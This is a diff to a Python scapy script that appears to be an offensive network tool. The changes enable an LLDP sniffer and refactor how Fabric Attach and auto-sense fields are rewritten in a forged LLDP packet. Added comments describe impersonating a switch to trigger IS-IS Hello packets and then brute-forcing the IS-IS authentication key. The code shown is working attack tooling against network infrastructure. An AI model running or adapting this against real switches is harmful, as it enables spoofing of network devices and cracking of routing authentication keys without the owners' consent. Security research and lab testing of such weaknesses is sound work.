@@ -97,7 +97,7 @@ def send_lldp(packet: Packet):
     #packet[0].getlayer(LLDPDUManagementAddress).show()
     #print(packet[0].getlayer(LLDPDUChassisID).id)
     
-    # Derive target MAC address' 5th byte.
+    # Derive target MAC address' 5th byte. Keep MAC vendor intact, and last byte to 00.
     new_mac = derive_mac(src_mac)
     # Derive target IP address' 4th byte.
     new_ip = derive_ip(src_ip)
@@ -117,11 +117,17 @@ def send_lldp(packet: Packet):
     pkt_to_send[LLDPDUManagementAddress].management_address = new_ip
 
     # FA and auto-sense are both OrganisationSpecific fields by scapy. The only for now to differentiate them is the org_code used.
-    # TODO : Check better way to loop and filter org_code.
-    if pkt_to_send[LLDPDUGenericOrganisationSpecific:1].org_code == 1037 :
-        pkt_to_send[LLDPDUGenericOrganisationSpecific:1].data = new_fa
-    if pkt_to_send[LLDPDUGenericOrganisationSpecific:2].org_code == 14189670 :
-        pkt_to_send[LLDPDUGenericOrganisationSpecific:2].data = new_autosense
+    REPLACEMENTS = {
+        1037:     new_fa,
+        14189670: new_autosense,
+    }
+    for layer in pkt_to_send.iterpayloads():
+        if isinstance(layer, LLDPDUGenericOrganisationSpecific) and layer.org_code in REPLACEMENTS:
+            layer.data = REPLACEMENTS[layer.org_code]
+    # if pkt_to_send[LLDPDUGenericOrganisationSpecific:1].org_code == 1037 :
+    #     pkt_to_send[LLDPDUGenericOrganisationSpecific:1].data = new_fa
+    # if pkt_to_send[LLDPDUGenericOrganisationSpecific:2].org_code == 14189670 :
+    #     pkt_to_send[LLDPDUGenericOrganisationSpecific:2].data = new_autosense
 
     #pkt_to_send.show()
     # TODO : Check packet conformity before sending ?
@@ -197,26 +203,31 @@ def find_key(packet: Packet):
 def main():
     # Start ISIS sniffer first in async mode, then start LLDP, so ISIS sniffer is already listening when LLDP triggers auto-sense.
     # Filter on ISIS Header and exclude your own MAC as source so you don't stop when you sniff your own packet.
+    start_time = time.time()
     isis_sniffer = AsyncSniffer(offline="Wireshark_captures/ISIS-21yHFT1Uy0qiM.pcapng", \
         lfilter=lambda p: p.haslayer(ISIS_CommonHdr) and p.src != MY_MAC, \
         count=1)
     isis_sniffer.start()
 
     # Start LLDP sniffer, filter on LLDP, stop asa you receive one
-    #lldp_sniffer = AsyncSniffer(offline="Wireshark_captures/sha-256-one-side-from-startup.pcapng", \
-    #    filter="ether proto 0x88cc", \
-    #    count=1)
-    #lldp_sniffer.start()
-    #lldp_sniffer.join(timeout=10) # If none is received during 10s, assume error
-    #send_lldp(lldp_sniffer.results[0])
+    lldp_sniffer = AsyncSniffer(offline="Wireshark_captures/ISIS-21yHFT1Uy0qiM.pcapng", \
+        filter="ether proto 0x88cc", \
+        count=1)
+    lldp_sniffer.start()
+    lldp_sniffer.join(timeout=10) # If none is received during 10s, assume error
+
+    # Impersonate a switch through LLDP to trigger ISIS Hello 
+    send_lldp(lldp_sniffer.results[0])
     
-    # Assume here for now that the LLDP packet is sent, and the target switch has answered. Proceed with ISIS key abuse.
+    # Assume here for now that the LLDP packet is sent, and the target switch has answered with a ISIS Hello packet.
+    # Proceed with ISIS key bruteforce.
     isis_sniffer.join(timeout=10) # If none is received during 10s, assume error
     isis_pkt = isis_sniffer.results[0]
     #isis_pkt.show()
 
     f_key = find_key(isis_pkt)
     #send_isis(isis_pkt, f_key)
+    print("--- %s seconds ---" % (time.time() - start_time))
 
 if __name__ == "__main__":
     main()
